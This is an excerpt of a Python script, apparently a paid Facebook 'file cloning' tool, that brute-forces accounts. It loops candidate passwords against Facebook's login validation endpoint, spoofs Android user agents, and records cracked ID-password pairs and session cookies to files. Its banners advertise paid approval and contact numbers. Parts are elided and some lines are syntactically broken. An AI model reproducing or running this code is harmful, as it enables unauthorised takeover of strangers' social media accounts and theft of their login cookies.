...
print('\033[38;5;46m[\033[38;5;46m+\033[38;5;46m] \033[38;5;46mChecReyad Update...? ')
time.sleep(5)
os.system('clear')
print("\33[1;96m[\33[1;96m+\33[1;96m] \33[1;96mFollow Me On Facebook")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/rs.rasel.najmul?mibextid=ZbWKwL')
#------------------[ Rasel-Hentai]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
ua = ["Mozilla/5.0 (Linux; Android 11; SM-M405F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/384.0.0.18.104",]
...
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
...
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A326U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
...
princp=[]
try:
    prox= requests.get('https://github.com/Mafiya-King/Aprv/blob/main/Aprv.txt').text
...
def uaku():def uaku():
        try:
                ...
                a=requests.get(f'https://github.com/Mafiya-King/Aprv/blob/main/Aprv.txt').text
                ua=open('.mix.txt','w')
...
def NAFISALWAYSONFIRE():
  ...
  id = "сп╛".join(uuid)
  server = requests.get(f'https://github.com/Mafiya-King/Aprv/blob/main/Aprv.txt').text



  os.system(f" clear")
  print(f"""
\033[38;5;46m  __  __        __ _                    _  ___             
\033[38;5;46m   |  \/  |      / _(_)                  | |/ (_)            
\033[38;5;46m   | \  / | __ _| |_ _ _   _  __ _ ______| ' / _ _ __   __ _ 
 \033[38;5;46m | |\/| |/ _` |  _| | | | |/ _` |______|  < | | '_ \ / _` |
\033[38;5;46m  | |  | | (_| | | | | |_| | (_| |      | . \| | | | | (_| |
 \033[38;5;46m |_|  |_|\__,_|_| |_|\__, |\__,_|      |_|\_\_|_| |_|\__, |
\033[38;5;46m                       __/ |                           __/ |
\033[38;5;46m                       |___/                           |___/


\033[1;36m============================================
\033[38;5;46m   \033[38;5;46mFACEBOK      : \033[38;5;46m BD NAFIS
\033[38;5;46m   \033[38;5;46mGITHUB       :  \033[38;5;46mTEAM-69
\033[38;5;46m   \033[38;5;46mTOOL STATUS  :  \033[38;5;46mFile clone TOOL
\033[38;5;46m   \033[38;5;46mTEAM         :  \033[38;5;46m69
\033[38;5;46m   \033[38;5;46mTOOL VIRSION :  \033[38;5;46mX-2
\033[1;36m============================================\n""")
  ...
  try:
    httpCaht = requests.get(f"https://github.com/Mafiya-King/Aprv/blob/main/Aprv.txt").text
    if id in httpCaht:
      ...
      os.system('am start https://wa.me/+8801861367215?text=' + tks)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
NAFISALWAYSONFIRE()
    try:
        ...
        a=requests.get('https://github.com/Mafiya-King/Aprv/blob/main/Aprv.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
...
#while attemps < 12345677901:
    ...
    #if username == 'RASEL' and password == 'rasel':
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Rasel.Reyad.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
          __  __        __ _                    _  ___             
 |  \/  |      / _(_)                  | |/ (_)            
 | \  / | __ _| |_ _ _   _  __ _ ______| ' / _ _ __   __ _ 
 | |\/| |/ _` |  _| | | | |/ _` |______|  < | | '_ \ / _` |
 | |  | | (_| | | | | |_| | (_| |      | . \| | | | | (_| |
 |_|  |_|\__,_|_| |_|\__, |\__,_|      |_|\_\_|_| |_|\__, |
                     ...
                     |___/                           |___/                                                    
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;94m        [ 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 𝙊𝙉𝙇𝙔 𝙈𝙊𝘽𝙄𝙇𝙀 𝘿𝘼𝙏𝘼\033[0;94m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
\033[0;94m➣👾 \033[0;94m𝘼𝙐𝙏𝙃𝙊𝙍   : Rasel            \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑮𝑰𝑻𝑯𝑼𝑩   : Mafiya-King              \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 : Rasel Chowdhury         \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷 : +8801773375432\033[0;94m
\033[0;94m➣👾 \033[0;94m𝑻𝑯𝑰𝑺 𝑻𝑶𝑶𝑳 𝑰𝑺 𝑷𝑨𝑰𝑫         \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑽𝑬𝑹𝑺𝑰𝑶𝑵       •X0.2   ] \033[0;94m
\033[0;94m➣👾 \033[0;94m𝑮𝑰𝑽𝑬 𝑴𝑬 150 𝒕𝒌 𝑭𝑶𝑹 𝑨𝑷𝑹𝑽𝑨𝑳  \033[0;94m
╠══[ 7 𝑫𝑨𝒀𝑺 150 𝑻𝒌➳
╠══[ 15 𝐷𝐴𝑌𝑆 300 𝑇𝑘➳
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
...
os.system('espeak -a 300 " Welcome,   to, Lord, Rasel, Tools"')
pass
...
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[38;5;46m[\033[38;5;46m+\033[38;5;46m] \033[1;92mUSER NAME\033[38;5;46m :\033[1;96m "+uname)
    print("\033[38;5;46m[\033[38;5;46m•\033[38;5;46m] \033[0;93mTODAY'S DATE :\033[38;5;46m "+date)
    print('\033[0;97m===============================================')
    print(f"""\033[38;5;46m[\033[38;5;46m1\033[38;5;46m] \033[38;5;46mFILE CLONING         """)
    print("""\033[38;5;46m[\033[38;5;46m2\033[38;5;46m] \033[0;93mADMIN""")        
    print('\033[0;97m=================')
    Rasel = input('\x1b[1;92m[+] CHOOSE: ')
    if Rasel in ['111']:
        login()
        dump_massal()
    elif Rasel in ['1']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Rasel.txt  Etc...]')
...
def setting():
    ...
    print("\033[97;1m[\033[92;1m3\033[97;1m] \033[0;92mCLONING FOR Game IDz")
    print('\033[0;91m=============================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Rasel•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                #print(f'\r\033[0;94m[Rasel-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Rasel-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Rasel-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Rasel-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Rasel-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Rasel,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
